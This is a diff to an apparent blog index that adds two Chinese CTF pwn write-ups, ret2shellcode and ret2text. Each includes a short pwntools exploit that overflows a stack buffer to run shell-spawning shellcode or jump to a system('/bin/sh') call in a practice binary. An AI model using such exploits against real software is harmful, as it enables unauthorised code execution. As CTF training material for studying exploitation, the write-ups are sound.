@@ -20,6 +20,8 @@
       
         <tags>
             
+            <tag> pwn </tag>
+            
             <tag> 二进制 </tag>
             
         </tags>
@@ -34,6 +36,33 @@
       <url>/2022/01/10/ret2shellcode/</url>
       
         <content type="html"><![CDATA[<ul><li><p>首先,checksec一下</p><img src="/2022/01/10/ret2shellcode/checksec.png" alt="image-20220111075622897" style="zoom:80%;"></li></ul><ul><li><p>运行一下</p><img src="/2022/01/10/ret2shellcode/run.png" alt="image-20220111075809324" style="zoom:80%;"></li><li><p>拖入ida查看</p><p>危险函数strncpy()</p><p>strncpy()用来复制字符串的前n个字符,其原型为:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char * strncpy(char *dest,const char *src,size_t n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>strncpy()会将字符串src的前n个字符拷贝到字符串dest.</p><p>strncpy()不会向dest追加标记’\0’.</p><ul><li><p>计算偏移</p><img src="/2022/01/10/ret2shellcode/offset.png" alt="image-20220111082354654" style="zoom:80%;"></li></ul></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2shellcode") 4 local = 1 5 if local: 6     r = process("./ret2shellcode") 7 else: 8     r = remote("") 9  10 buf2 = 0x0804A08011  12 shellcode = asm(shellcraft.sh())13  14 #payload = b'a'*0x6c +b'a'*4 + p32(buf2)15  16 #r.sendline(payload)17 r.sendline(shellcode.ljust(112,'a')+p32(buf2))18 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ljust()作用:</p><p>返回一个原字符串并左对齐</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ret2text</title>
+      <link href="/2022/01/10/ret2text/"/>
+      <url>/2022/01/10/ret2text/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>首先checksec</p><img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li><li><p>拖入IDA</p><ul><li><p>发现危险函数</p><img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li></ul></li><li><ul><li><p>发现system和bin/sh</p><img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li></ul></li><li><p>找到s相对于ebp的距离0x6c+4</p><img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li><li><p>编写exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                             2 log_level = 'debug'  3 local = 1  4 if local:  5     r = process("./ret2text")  6 else:  7     r = remote("")  8 elf = ELF("./ret2text")  9   10 s = 0x6c + 4 11 system_addr = 0x0804863A 12   13 payload = b'a'*s+p32(system_addr) 14 r.sendline(payload) 15   16 r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
       
       
       <categories>
